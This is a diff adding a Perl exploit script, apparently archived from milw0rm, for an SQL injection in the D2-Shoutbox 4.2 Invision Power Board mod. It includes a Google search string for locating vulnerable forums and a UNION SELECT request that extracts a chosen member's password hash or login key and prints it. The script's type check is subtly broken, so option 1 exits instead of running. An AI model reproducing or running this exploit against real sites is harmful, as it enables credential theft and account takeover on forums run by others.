@@ -1,0 +1,68 @@
+#!/usr/bin/perl
+#########################################################
+#		 _______ _______ ______ 		#
+#		 |______ |______ |     \		#
+#		 ______| |______ |_____/		#
+#		                        		#
+#D2-Shoutbox 4.2(IPB Mod)<=SQL injection		#
+#Created By SkOd                                        #
+#SED security Team                                      #
+#http://www.sed-team.be                                 #
+#skod.uk@gmail.com                                      #
+#ISRAEL                                                 #
+#########################################################
+#google:
+#"Powered By D2-Shoutbox 4.2"
+#########################################################
+use IO::Socket;
+$host = $ARGV[0];
+$user = $ARGV[2];
+$uid  = $ARGV[3];
+$pid  = $ARGV[4];
+$type = $ARGV[5];
+
+sub type()
+{
+if($type==1){$row="password";}
+if($type==2){$row="member_login_key";}
+else{print "Just 1 Or 2\n";exit();}
+$sql="index.php?act=Shoutbox&view=saved&load=-1%20UNION%20SELECT%20null,null,null,null,".$row.",null,null,null%20FROM%20ibf_members%20where%20id=".$user."/*";
+$path = $ARGV[1].$sql;
+}
+
+
+sub header()
+{
+print q{
+#######################################################################
+###		 D2-Shoutbox 4.2 SQL injection Exploit 	    	    ### 
+###		 Tested On D2-Shoutbox 4.2 And IPB 2.4 	    	    ###
+###		  Created By SkOd, Sed Security Team 	    	    ###
+#######################################################################
+sedSB.pl [HOST] [DIR] [victim] [my id] [my md5 hash] [1-(1.*)/2-(2.*)]
+sedSB.pl www.host.com /forum/ 2 4500 f3b8a336b250ee595dc6ef6bac38b647 2
+#######################################################################
+}
+}
+
+sub sedsock()
+{
+$sedsock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => "80") || die "[-]Connect Failed\r\n";
+print $sedsock "GET $path HTTP/1.1\n";
+print $sedsock "Host: $host\n";
+print $sedsock "Accept: */*\n";
+print $sedsock "Cookie: member_id=$uid; pass_hash=$pid\n";
+print $sedsock "Connection: close\n\n";
+while($res = <$sedsock>){
+$res =~ m/shout_s'>(.*?)<\/textarea>/ && print "[+]User: $user\n[+]Md5 Hash: $1\n";
+}
+}
+
+if(@ARGV < 6){
+header();
+}else{
+type();
+sedsock();
+}
+
+# milw0rm.com [2006-03-06]
